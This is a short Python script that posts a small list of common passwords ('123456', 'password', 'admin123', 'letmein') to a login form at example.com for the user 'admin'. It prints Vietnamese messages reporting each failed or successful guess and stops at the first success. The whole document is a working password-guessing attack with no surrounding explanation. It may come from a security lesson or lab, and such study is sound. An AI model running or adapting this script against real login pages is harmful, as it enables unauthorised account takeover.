import requests

url = "http://example.com/login"
user = "admin"
passwords = ["123456", "password", "admin123", "letmein"]

for pw in passwords:
    r = requests.post(url, data={"username": user, "password": pw})
    if "Welcome" in r.text:
        print(f"✅ Đăng nhập thành công với mật khẩu: {pw}")
        break
    else:
        print(f"❌ Thử mật khẩu thất bại: {pw}")
